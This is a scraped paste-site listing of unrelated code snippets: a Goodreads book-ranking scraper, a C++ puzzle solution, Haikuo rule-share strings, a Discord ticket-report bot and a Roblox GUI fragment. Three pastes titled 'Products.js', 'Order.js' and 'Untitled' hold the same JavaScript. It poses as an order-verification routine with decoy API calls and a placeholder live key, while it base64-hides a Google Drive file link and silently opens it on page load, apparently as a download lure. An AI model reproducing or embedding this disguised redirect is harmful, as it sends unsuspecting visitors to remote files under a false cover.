df = df.drop(columns=['temp_url'])

# Display analysis
if not df.empty:
    print(""\n=== ANALYSIS ==="")
    
    # Find highest rated book
    highest_rated = df.loc[df['avg_rating'].idxmax()]
    print(f""Book with highest average rating ({highest_rated['avg_rating']}):"")
    print(f""Title: {highest_rated['title']}"")
    print(f""Author: {highest_rated['author']}"")
    print(f""Rank: {highest_rated['rank']}"")
    print(f""Score: {highest_rated['score']:,}"")  # Format with commas
    if highest_rated['description']:
        print(f""Description: {highest_rated['description']}"")
    
    # Find highest score book
    if df['score'].max() > 0:
        highest_score = df.loc[df['score'].idxmax()]
        print(""\nBook with highest score ({:,}):"".format(highest_score['score']))
        print(f""Title: {highest_score['title']}"")
        print(f""Author: {highest_score['author']}"")
        print(f""Rank: {highest_score['rank']}"")
        print(f""Average Rating: {highest_score['avg_rating']}"")
        if highest_score['description']:
            print(f""Description: {highest_score['description']}"")
        
        print(""\nAre they the same book?"", ""Yes"" if highest_rated['rank'] == highest_score['rank'] else ""No"")
    else:
        print(""\nCould not determine highest score book as all scores are 0"")
    
    # Save to files
    df.to_csv(""goodreads_top_books_final.csv"", index=False)
else:
    print(""No books were collected"")"
raXMn59S,gr scrape good but not fiull desc,STANAANDREY,Python,Tuesday 8th of April 2025 10:41:55 AM CDT,"import requests
from bs4 import BeautifulSoup
import pandas as pd
import re
import time
import random

def scrape_goodreads_best_books(num_pages=3):
    all_books = []
    base_url = ""https://www.goodreads.com/list/show/1.Best_Books_Ever""
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    ]
    
    for page in range(1, num_pages + 1):
        if page == 1:
            url = base_url
        else:
            url = f""{base_url}?page={page}""
        
        print(f""Scraping page {page}: {url}"")
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        if page > 1:
            delay = random.uniform(2, 5)
            print(f""Waiting {delay:.2f} seconds before next request..."")
            time.sleep(delay)
        
        try:
            response = requests.get(url, headers=headers, timeout=30)
            print(f""Response status code: {response.status_code}"")
            
            if response.status_code != 200:
                print(f""Failed to retrieve page {page}. Stopping."")
                break
                
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check if we're being blocked
            title = soup.title.text if soup.title else ""No title found""
            if ""robot"" in title.lower() or ""captcha"" in title.lower() or ""blocked"" in title.lower():
                print(f""Detected anti-bot measures on page {page}. Stopping."")
                break
            
            # Find all book entries on the page
            book_elements = soup.select(""table.tableList tr"")
            print(f""Found {len(book_elements)} books on page {page}"")
            
            # Save the HTML for debugging
            if page == 1:
                with open(""goodreads_page.html"", ""w"", encoding=""utf-8"") as f:
                    f.write(response.text)
                print(""Saved first page HTML for debugging"")
            
            # Calculate base ranking for this page
            base_rank = (page - 1) * 100
            
            # Extract data for each book
            for i, book in enumerate(book_elements):
                try:
                    # Calculate ranking
                    rank = base_rank + i + 1
                    
                    # Extract title and URL
                    title_el = book.select_one("".bookTitle"")
                    title = title_el.text.strip() if title_el else ""Unknown Title""
                    
                    # Extract book URL
                    book_url = None
                    if title_el and title_el.get('href'):
                        book_url = f""https://www.goodreads.com{title_el.get('href')}""
                    
                    # Extract author
                    author_el = book.select_one("".authorName"")
                    author = author_el.text.strip() if author_el else ""Unknown Author""
                    
                    # Extract rating
                    rating_el = book.select_one("".minirating"")
                    rating_text = rating_el.text.strip() if rating_el else """"
                    rating_match = re.search(r'(\d+\.\d+)', rating_text)
                    avg_rating = float(rating_match.group(1)) if rating_match else None
                    
                    # Extract score - try multiple approaches
                    score = 0
                    
                    # First approach: look for text with ""score:"" in it
                    score_elements = book.select("".smallText"")
                    for el in score_elements:
                        text = el.text.strip()
                        if ""score:"" in text.lower():
                            score_match = re.search(r'score:\s*([\d,]+)', text, re.IGNORECASE)
                            if score_match:
                                score = int(score_match.group(1).replace(',', ''))
                                break
                    
                    # Second approach: look for vote count
                    if score == 0:
                        vote_elements = book.select("".greyText"")
                        for el in vote_elements:
                            text = el.text.strip()
                            vote_match = re.search(r'([\d,]+)\s+people voted', text)
                            if vote_match:
                                score = int(vote_match.group(1).replace(',', ''))
                                break
                    
                    # Third approach: directly extract from the page structure
                    if score == 0 and i == 0 and page == 1:  # For debugging the first book
                        print(f""DEBUG - Book HTML: {book}"")
                        all_text = book.get_text()
                        print(f""DEBUG - All text: {all_text}"")
                    
                    # Create book entry
                    book_data = {
                        ""rank"": rank,
                        ""title"": title,
                        ""author"": author,
                        ""avg_rating"": avg_rating,
                        ""score"": score,
                        ""url"": book_url
                    }
                    
                    all_books.append(book_data)
                    
                except Exception as e:
                    print(f""Error extracting book {i+1} on page {page}: {e}"")
            
        except Exception as e:
            print(f""Error processing page {page}: {e}"")
    
    print(f""Total books collected: {len(all_books)}"")
    return all_books

def get_book_description(book_url):
    """"""Fetch the book description from its detail page""""""
    if not book_url:
        return ""No description available""
    
    try:
        time.sleep(random.uniform(1, 3))
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        }
        
        response = requests.get(book_url, headers=headers, timeout=30)
        
        if response.status_code != 200:
            return ""Failed to retrieve description""
            
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Try different selectors for description
        description_el = (
            soup.select_one(""#description span[style='display:none']"") or
            soup.select_one(""#description span"") or
            soup.select_one("".DetailsLayoutRightParagraph__widthConstrained"") or
            soup.select_one(""[data-testid='description']"") or
            soup.select_one(""#description"")
        )
        
        if description_el:
            return description_el.text.strip()
        else:
            book_desc_section = soup.find('div', id='descriptionContainer')
            if book_desc_section:
                return book_desc_section.text.strip()
            return ""No description found on page""
            
    except Exception as e:
        return f""Error fetching description: {e}""

# Let's try a different approach - manually extract scores from the page
def extract_scores_from_page(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
    }
    
    response = requests.get(url, headers=headers, timeout=30)
    if response.status_code != 200:
        return {}
    
    soup = BeautifulSoup(response.text, 'html.parser')
    
    # Find all vote count elements
    scores = {}
    book_elements = soup.select(""table.tableList tr"")
    
    for i, book in enumerate(book_elements):
        rank = i + 1
        
        # Try to find the vote count text
        vote_text = None
        
        # Look for the specific pattern in the HTML
        for div in book.select(""div.uitext""):
            text = div.text.strip()
            if ""people voted"" in text:
                vote_text = text
                break
        
        if vote_text:
            vote_match = re.search(r'([\d,]+)\s+people voted', vote_text)
            if vote_match:
                score = int(vote_match.group(1).replace(',', ''))
                scores[rank] = score
    
    return scores

# Main execution
print(""Starting Goodreads Best Books scraper..."")
books = scrape_goodreads_best_books(num_pages=3)

# Create DataFrame
df = pd.DataFrame(books)

# Sort by rank to ensure proper order
df = df.sort_values('rank')

# Try to extract scores directly from the pages
print(""\nExtracting scores from pages..."")
page1_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever"")
page2_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever?page=2"")
page3_scores = extract_scores_from_page(""https://www.goodreads.com/list/show/1.Best_Books_Ever?page=3"")

# Update scores in the DataFrame
for rank, score in page1_scores.items():
    df.loc[df['rank'] == rank, 'score'] = score

for rank, score in page2_scores.items():
    df.loc[df['rank'] == (rank + 100), 'score'] = score

for rank, score in page3_scores.items():
    df.loc[df['rank'] == (rank + 200), 'score'] = score

# Get descriptions for top 10 books
if not df.empty:
    print(""\nFetching descriptions for top 10 books..."")
    df['description'] = None  # Initialize description column
    
    # Get top 10 books
    top_10 = df.head(10)
    
    for idx, book in top_10.iterrows():
        print(f""Fetching description for #{book['rank']}: {book['title']}"")
        description = get_book_description(book['url'])
        df.at[idx, 'description'] = description
    
    # Find highest rated book
    highest_rated = df.loc[df['avg_rating'].idxmax()]
    if highest_rated['rank'] > 10:  # If not already in top 10
        print(f""\nFetching description for highest rated book: {highest_rated['title']}"")
        highest_rated_desc = get_book_description(highest_rated['url'])
        df.loc[df['rank'] == highest_rated['rank'], 'description'] = highest_rated_desc
    
    # Find highest score book
    if df['score'].max() > 0:  # Only if we have valid scores
        highest_score = df.loc[df['score'].idxmax()]
        if highest_score['rank'] > 10:  # If not already in top 10
            print(f""Fetching description for highest score book: {highest_score['title']}"")
            highest_score_desc = get_book_description(highest_score['url'])
            df.loc[df['rank'] == highest_score['rank'], 'description'] = highest_score_desc
    
    # Display analysis
    print(""\n=== ANALYSIS ==="")
    print(f""Book with highest average rating ({highest_rated['avg_rating']}):"")
    print(f""Title: {highest_rated['title']}"")
    print(f""Author: {highest_rated['author']}"")
    print(f""Rank: {highest_rated['rank']}"")
    print(f""Score: {highest_rated['score']}"")
    print(""Description:"")
    highest_rated_desc = df.loc[df['rank'] == highest_rated['rank'], 'description'].values[0]
    print(highest_rated_desc[:500] + ""..."" if highest_rated_desc and len(highest_rated_desc) > 500 else highest_rated_desc)
    
    # Find highest score book for analysis
    if df['score'].max() > 0:
        highest_score = df.loc[df['score'].idxmax()]
        print(""\nBook with highest score ({:,}):"".format(highest_score['score']))
        print(f""Title: {highest_score['title']}"")
        print(f""Author: {highest_score['author']}"")
        print(f""Rank: {highest_score['rank']}"")
        print(f""Average Rating: {highest_score['avg_rating']}"")
        print(""Description:"")
        highest_score_desc = df.loc[df['rank'] == highest_score['rank'], 'description'].values[0]
        print(highest_score_desc[:500] + ""..."" if highest_score_desc and len(highest_score_desc) > 500 else highest_score_desc)
        
        print(""\nAre they the same book?"", ""Yes"" if highest_rated['rank'] == highest_score['rank'] else ""No"")
    else:
        print(""\nCould not determine highest score book as all scores are 0"")
    
    # Save to files
    df.to_csv(""goodreads_top_books.csv"", index=False)
    df.to_excel(""goodreads_top_books.xlsx"", index=False)
    print(""\nResults saved to goodreads_top_books.csv and goodreads_top_books.xlsx"")
else:
    print(""No books were collected"")"
qigY6UP6,Untitled,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:35:50 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34869/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3ADPqL7Z,混乘数字 参考代码,Dmaxiya,C++,Tuesday 8th of April 2025 10:33:34 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
int ans;
LL p[20];

LL getHash(int x, int y) {
    LL ret = 0;
    while (x != 0) {
        ret += p[x % 10];
        x /= 10;
    }
    while (y != 0) {
        ret += p[y % 10];
        y /= 10;
    }
    return ret;
}

bool judge(int x) {
    LL xHash = getHash(x, 0);
    for (int i = 2; i <= x / i; ++i) {
        if (x % i == 0) {
            if (getHash(i, x / i) == xHash) {
                return true;
            }
        }
    }
    return false;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    p[0] = 1;
    for (int i = 1; i < 10; ++i) {
        p[i] = p[i - 1] * 10;
    }
    for (int i = 1; i <= 1000000; ++i) {
        if (judge(i)) {
            ++ans;
        }
    }
    cout << ans << endl;
//    cout << 590 << endl;

    return 0;
}
"
AM4KvkUq,Products.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:20:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86549/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Hi16ZYxY,邀您一起看：主页设置-主题管理-⤻分享,xiaomianao666,JavaScript,Tuesday 8th of April 2025 10:15:01 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-主题管理-⤻分享@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG5pbmRleCA9PiB7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJleHBvcnRcXFwiLCBpbmRleCk7XFxufVxcbikoXFxcIjFcXFwiKVwiLFwiZ3JvdXBcIjpcIlwifSIsInRpdGxlIjoi5Li76aG16K6+572uLeS4u+mimOeuoeeQhi3ipLvliIbkuqsifQ==
5XdnXqdf,邀您一起看：主页设置-主题管理-⤻分享,xiaomianao666,JavaScript,Tuesday 8th of April 2025 10:14:47 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥主页设置-主题管理-⤻分享@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eSNub1JlY29yZEhpc3RvcnkjXCIsXCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwiZmluZF9ydWxlXCI6XCJqczpldmFsKGZldGNoKCdoaWtlcjovL2Fzc2V0cy9ob21lLmpzJykpOyhcXG5pbmRleCA9PiB7XFxuICAgIEhpa2VySG9tZS5sb2FkKFxcXCJleHBvcnRcXFwiLCBpbmRleCk7XFxufVxcbikoXFxcIjBcXFwiKVwiLFwiZ3JvdXBcIjpcIlwifSIsInRpdGxlIjoi5Li76aG16K6+572uLeS4u+mimOeuoeeQhi3ipLvliIbkuqsifQ==
xQkcC6Ee,Tickets Report ( Discord ),DeveloperADMIN,JavaScript,Tuesday 8th of April 2025 10:09:08 AM CDT,"const { Client, GatewayIntentBits, EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ]
});
/////////////////////////////////////////////// Setup /////////////////////////////////////////////////

const PREFIX = ""-""; // البريفكس
const rpi = ''; // id log channel - اي دي اتشانل اللوج
const token = """"; // توكن البوت

///////////////////////////////////////////////////////////////////////////////////////////////////////
const tic = new Map();
let lang = 'ar'; 

const translations = {
    ar: {
        noTicketId: ""لم يتم العثور على رقم التذكرة. الرجاء النقر على الزر لإدخال الرقم يدويًا."",
        enterTicketNumber: ""إدخال رقم التذكرة"",
        closeTicket: ""إغلاق التذكرة"",
        fillDetails: ""لاستكمال الإجراءات، يرجى ملء البيانات التالية:\n- بيانات المسؤول\n- بيانات التذكرة"",
        ticketNumber: ""رقم التذكرة:"",
        ticketLink: ""رابط التذكرة:"",
        adminData: ""بيانات المسؤول"",
        ticketData: ""بيانات التذكرة"",
        savedTicketNum: (num) => `تم حفظ رقم التذكرة: ${num}`,
        adminModalTitle: ""بيانات المسؤول"",
        adminLabel: ""اسم المسؤول عن التذكرة (اليوزر أو الآيدي)"",
        statusLabel: ""حالة التذكرة: (مغلق / مفتوح / قيد المعالجة)"",
        ticketModalTitle: ""تقرير التذكرة"",
        reasonLabel: ""سبب فتح التذكرة؟"",
        actionsTakenLabel: ""ما هي الإجراءات المتخذة؟"",
        contactedLabel: ""هل تم التواصل مع المستخدم؟ (نعم/لا)"",
        resolvedLabel: ""هل تم حل المشكلة؟ (نعم/لا)"",
        notesLabel: ""ملاحظات إضافية (اختياري)"",
        savedAdmin: ""تم حفظ بيانات المسؤول."",
        reportTitle: ""تقرير التذكرة"",
        doneSend: ""**تم الارسال**"",
        noData: ""حدث خطاء"",
        langChanged: ""تم تغيير اللغة إلى العربية."",
        staffticket: ""المسؤول عن التذكرة"",
        ticketst: ""حالة التذكرة"",
        adnote: ""ملاحظات إضافية"",
        addnote: ""لا يوجد""
        
    },
    en: {
        noTicketId: ""Ticket number not found. Please click the button to enter it manually."",
        enterTicketNumber: ""Enter Ticket Number"",
        closeTicket: ""Close Ticket"",
        fillDetails: ""To proceed, please fill in the following:\n- Admin Info\n- Ticket Info"",
        ticketNumber: ""Ticket Number:"",
        ticketLink: ""Ticket Link:"",
        adminData: ""Admin Info"",
        ticketData: ""Ticket Info"",
        savedTicketNum: (num) => `Ticket number saved: ${num}`,
        adminModalTitle: ""Admin Info"",
        adminLabel: ""Admin name (username or ID)"",
        statusLabel: ""Ticket Status: (Closed / Open / Processing)"",
        ticketModalTitle: ""Ticket Report"",
        reasonLabel: ""Why was the ticket opened?"",
        actionsTakenLabel: ""What actions were taken?"",
        contactedLabel: ""Was the user contacted? (Yes/No)"",
        resolvedLabel: ""Was the issue resolved? (Yes/No)"",
        notesLabel: ""Additional notes (optional)"",
        savedAdmin: ""Admin data saved."",
        reportTitle: ""Ticket Report"",
        doneSend: ""**Done Send**"",
        noData: ""Error: No data saved"",
        langChanged: ""Language changed to English."",
        staffticket: ""Ticket Staff"",
        ticketst: ""Ticket status"",
        adnote: ""Additional notes"",
        addnote: ""No Notes""
    }
};

let t = translations[lang];

bot.once('ready', () => {
    console.log(`Done ${bot.user.tag}`);
});

bot.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'lang') {
        if (args[0] === 'ar' || args[0] === 'en') {
            lang = args[0];
            t = translations[lang];
            await message.reply(t.langChanged);
        } else {
            await message.reply(""Usage: -lang [ar/en]"");
        }
        return;
    }

    if (command === 'tc') {
        const channel = message.channel;
        const ticid = channel.name.split('-').pop();

        if (!ticid || isNaN(ticid)) {
            const button = new ButtonBuilder()
                .setCustomId('req_ticket_num')
                .setLabel(t.enterTicketNumber)
                .setStyle(ButtonStyle.Primary);

            const row = new ActionRowBuilder().addComponents(button);

            await message.reply({
                content: t.noTicketId,
                components: [row]
            });
            return;
        }

        tic.set(channel.id, { ticid });

        const confirmEmbed = new EmbedBuilder()
            .setTitle(t.closeTicket)
            .setDescription(t.fillDetails)
            .addFields(
                { name: t.ticketNumber, value: ticid, inline: true },
                { name: t.ticketLink, value: `<#${channel.id}>`, inline: true }
            )
            .setColor(0x29D2D2);

        const adminButton = new ButtonBuilder()
            .setCustomId('admin_data')
            .setLabel(t.adminData)
            .setStyle(ButtonStyle.Primary);

        const ticketButton = new ButtonBuilder()
            .setCustomId('tic_data')
            .setLabel(t.ticketData)
            .setStyle(ButtonStyle.Secondary);

        const row = new ActionRowBuilder().addComponents(adminButton, ticketButton);

        await message.channel.send({ embeds: [confirmEmbed], components: [row] });
    }
});

bot.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'req_ticket_num') {
        const modal = new ModalBuilder()
            .setCustomId('ticket_num_modal')
            .setTitle(t.enterTicketNumber);

        const ticketNumberInput = new TextInputBuilder()
            .setCustomId('ticket_num')
            .setLabel(t.ticketNumber)
            .setStyle(TextInputStyle.Short)
            .setRequired(true);

        modal.addComponents(new ActionRowBuilder().addComponents(ticketNumberInput));

        await interaction.showModal(modal);
        return;
    }

    if (interaction.isModalSubmit() && interaction.customId === 'ticket_num_modal') {
        const ticketNum = interaction.fields.getTextInputValue('ticket_num');
        const channelID = interaction.channel.id;

        tic.set(channelID, { ticid: ticketNum });

        await interaction.reply({ content: t.savedTicketNum(ticketNum), ephemeral: true });

        const confirmEmbed = new EmbedBuilder()
            .setTitle(t.closeTicket)
            .setDescription(t.fillDetails)
            .addFields(
                { name: t.ticketNumber, value: ticketNum, inline: true },
                { name: t.ticketLink, value: `<#${channelID}>`, inline: true }
            )
            .setColor(0x29D2D2);

        const adminButton = new ButtonBuilder()
            .setCustomId('admin_data')
            .setLabel(t.adminData)
            .setStyle(ButtonStyle.Primary);

        const ticketButton = new ButtonBuilder()
            .setCustomId('tic_data')
            .setLabel(t.ticketData)
            .setStyle(ButtonStyle.Secondary);

        await interaction.channel.send({ embeds: [confirmEmbed], components: [new ActionRowBuilder().addComponents(adminButton, ticketButton)] });
    }

    if (interaction.isButton() && (interaction.customId === 'admin_data' || interaction.customId === 'tic_data')) {
        const channelID = interaction.channel.id;
        const ticket = tic.get(channelID);
        if (!ticket) return interaction.reply({ content: t.noData, ephemeral: true });

        if (interaction.customId === 'admin_data') {
            const modal = new ModalBuilder()
                .setCustomId('ad_rp')
                .setTitle(t.adminModalTitle);

            const adminInput = new TextInputBuilder()
                .setCustomId('admin')
                .setLabel(t.adminLabel)
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const statusInput = new TextInputBuilder()
                .setCustomId('status')
                .setLabel(t.statusLabel)
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(
                new ActionRowBuilder().addComponents(adminInput),
                new ActionRowBuilder().addComponents(statusInput)
            );

            await interaction.showModal(modal);
        } else if (interaction.customId === 'tic_data') {
            const modal = new ModalBuilder()
                .setCustomId('tic_rp')
                .setTitle(t.ticketModalTitle);

            const reasonInput = new TextInputBuilder()
                .setCustomId('reason')
                .setLabel(t.reasonLabel)
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const actionInput = new TextInputBuilder()
                .setCustomId('actions_taken')
                .setLabel(t.actionsTakenLabel)
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(true);

            const contactInput = new TextInputBuilder()
                .setCustomId('contacted')
                .setLabel(t.contactedLabel)
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const resolvedInput = new TextInputBuilder()
                .setCustomId('resolved')
                .setLabel(t.resolvedLabel)
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            const notesInput = new TextInputBuilder()
                .setCustomId('notes')
                .setLabel(t.notesLabel)
                .setStyle(TextInputStyle.Paragraph)
                .setRequired(false);

            modal.addComponents(
                new ActionRowBuilder().addComponents(reasonInput),
                new ActionRowBuilder().addComponents(actionInput),
                new ActionRowBuilder().addComponents(contactInput),
                new ActionRowBuilder().addComponents(resolvedInput),
                new ActionRowBuilder().addComponents(notesInput)
            );

            await interaction.showModal(modal);
        }
    }

    if (interaction.isModalSubmit() && (interaction.customId === 'ad_rp' || interaction.customId === 'tic_rp')) {
        const channelID = interaction.channel.id;
        const ticket = tic.get(channelID);
        if (!ticket) return interaction.reply({ content: t.noData, ephemeral: true });

        if (interaction.customId === 'ad_rp') {
            const admin = interaction.fields.getTextInputValue('admin');
            const status = interaction.fields.getTextInputValue('status');

            tic.set(channelID, { ...ticket, admin, status });

            await interaction.reply({ content: t.savedAdmin, ephemeral: true });
        } else if (interaction.customId === 'tic_rp') {
            const reason = interaction.fields.getTextInputValue('reason');
            const actionsTaken = interaction.fields.getTextInputValue('actions_taken');
            const contacted = interaction.fields.getTextInputValue('contacted');
            const resolved = interaction.fields.getTextInputValue('resolved');
            const notes = interaction.fields.getTextInputValue('notes') || t.addnote;

            const staffMember = interaction.user;

            const finalData = { ...tic.get(channelID), reason, actionsTaken, contacted, resolved, notes };

            const reportEmbed = new EmbedBuilder()
                .setTitle(t.reportTitle)
                .setColor(0x29D2D2)
                .addFields(
                    { name: t.ticketNumber, value: finalData.ticid, inline: true },
                    { name: t.ticketLink, value: `<#${channelID}>`, inline: true },
                    { name: t.staffticket, value: finalData.admin, inline: true },
                    { name: t.ticketst, value: finalData.status, inline: true },
                    { name: t.reasonLabel, value: finalData.reason, inline: false },
                    { name: t.actionsTakenLabel, value: finalData.actionsTaken, inline: false },
                    { name: t.contactedLabel, value: finalData.contacted, inline: true },
                    { name: t.resolvedLabel, value: finalData.resolved, inline: true },
                    { name: t.adnote, value: finalData.notes, inline: false }
                )
                .setFooter({ text: `${staffMember.tag}`, iconURL: staffMember.displayAvatarURL() });

            const reportChannel = await bot.channels.fetch(rpi);
            if (reportChannel.isTextBased()) {
                await reportChannel.send({ embeds: [reportEmbed] });
            }

            tic.delete(channelID);

            await interaction.reply({ content: t.doneSend, ephemeral: true });
        }
    }
});

bot.login(token);
"
iqnEMHWc,Order.js,SpawnKz,JavaScript,Tuesday 8th of April 2025 10:05:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39912/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
PdDkJPkp,moveset#1,FEDYAGURIN,Lua,Tuesday 8th of April 2025 09:58:58 AM CDT,"--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 20 | Scripts: 3 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.SeishiroNagi
G2L[""1""] = Instance.new(""ScreenGui"", game:GetService(""Players"").LocalPlayer:WaitForChild(""PlayerGui""));
G2L[""1""][""Name""] = [[SeishiroNagi]];
G2L[""1""][""ZIndexBehavior""] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.SeishiroNagi.Frame
